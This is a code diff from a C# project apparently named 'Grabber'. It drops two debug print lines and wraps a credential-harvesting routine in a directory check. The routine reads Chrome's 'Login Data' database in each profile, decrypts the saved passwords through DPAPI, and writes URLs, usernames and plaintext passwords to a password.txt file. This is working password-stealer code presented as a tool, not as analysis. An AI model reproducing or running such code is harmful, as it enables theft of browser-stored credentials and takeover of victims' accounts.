@@ -69,7 +69,6 @@ namespace Grabber
                     {
 
                         string[] values = line.Split('"');
-                        Console.WriteLine(values[1]);
                         list.Add(values[1]);
                         foundProfile = true;
 
@@ -78,7 +77,6 @@ namespace Grabber
                     else if (line.Contains(@"""name"":") && foundProfile)
                     {
                         string[] values = line.Split('"');
-                        Console.WriteLine(values[3]);
                         foundProfile = false;
                         list.Add(values[3]);
                     }
@@ -107,40 +105,44 @@ namespace Grabber
         {
             cd += "\\Chrome";
 
-            foreach (string profile in Directory.GetDirectories(cd))
+            if (Directory.Exists(cd))
             {
-                SQLiteConnection conn = new SQLiteConnection("Data Source=" + profile + "\\Login Data");
 
-                conn.Open();
-
-                SQLiteCommand retrieveData = conn.CreateCommand();
-                retrieveData.CommandText = "SELECT action_url, username_value, password_value FROM logins";
-                SQLiteDataReader data = retrieveData.ExecuteReader();
-
-                List<string> decryptedData = new List<string>();
-                while (data.Read())
+                foreach (string profile in Directory.GetDirectories(cd))
                 {
-                    string url = (string)data["action_url"];
-                    string username = (string)data["username_value"];
-                    string decryptedPassword = "";
+                    SQLiteConnection conn = new SQLiteConnection("Data Source=" + profile + "\\Login Data");
 
-                    byte[] encryptedPassword = (byte[])data["password_value"];
+                    conn.Open();
 
-                    byte[] outBytes = DPAPI.decryptBytes(encryptedPassword);
+                    SQLiteCommand retrieveData = conn.CreateCommand();
+                    retrieveData.CommandText = "SELECT action_url, username_value, password_value FROM logins";
+                    SQLiteDataReader data = retrieveData.ExecuteReader();
 
-                    decryptedPassword = Encoding.Default.GetString(outBytes);
-
-                    if (decryptedPassword != "")
+                    List<string> decryptedData = new List<string>();
+                    while (data.Read())
                     {
-                        decryptedData.Add(url);
-                        decryptedData.Add(username);
-                        decryptedData.Add(decryptedPassword);
+                        string url = (string)data["action_url"];
+                        string username = (string)data["username_value"];
+                        string decryptedPassword = "";
+
+                        byte[] encryptedPassword = (byte[])data["password_value"];
+
+                        byte[] outBytes = DPAPI.decryptBytes(encryptedPassword);
+
+                        decryptedPassword = Encoding.Default.GetString(outBytes);
+
+                        if (decryptedPassword != "")
+                        {
+                            decryptedData.Add(url);
+                            decryptedData.Add(username);
+                            decryptedData.Add(decryptedPassword);
+                        }
                     }
+
+                    File.WriteAllLines(profile + "\\password.txt", decryptedData.ToArray());
+
+                    conn.Close();
                 }
-
-                File.WriteAllLines(profile + "\\password.txt", decryptedData.ToArray());
-
-                conn.Close();
             }
         }
     }
